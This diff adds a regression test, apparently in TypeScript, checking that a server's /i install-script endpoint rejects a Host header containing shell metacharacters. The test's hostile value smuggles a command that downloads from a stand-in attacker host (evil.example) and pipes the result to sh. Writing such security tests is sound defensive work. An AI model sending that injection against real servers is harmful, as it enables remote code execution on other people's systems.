@@ -101,3 +101,23 @@ test("POST /i/redeem: one-shot JSON credentials — 200 once, 410 after; unknown
   }
   assert.equal(last, 429, "the redeem rate limit guards the endpoint (redeemRateOk)");
 });
+
+/* audit round 1 (B1): /i embeds the client-controlled Host header in the
+   served script — the assertSafeServerUrl choke point blocks the breakout
+   today, but nothing failed if it regressed. Same pin as the sibling
+   /agent/install.sh embed (delivery-dialable.test.ts): fetch forbids
+   overriding Host, so go one level down (node:http). */
+test("GET /i with a metacharacter Host header refuses to embed it (400)", async () => {
+  const { get } = await import("node:http");
+  const hostile = "x'; curl evil.example/p | sh #'";
+  const { status, body } = await new Promise<{ status: number; body: string }>((res, rej) => {
+    const req = get(`${srv.base}/i`, { headers: { host: hostile } }, (r) => {
+      let b = "";
+      r.on("data", (c) => (b += c));
+      r.on("end", () => res({ status: r.statusCode ?? 0, body: b }));
+    });
+    req.on("error", rej);
+  });
+  assert.equal(status, 400, "a hostile Host must never reach the script");
+  assert.ok(!body.includes("curl evil"), "nothing of the injection survives");
+});
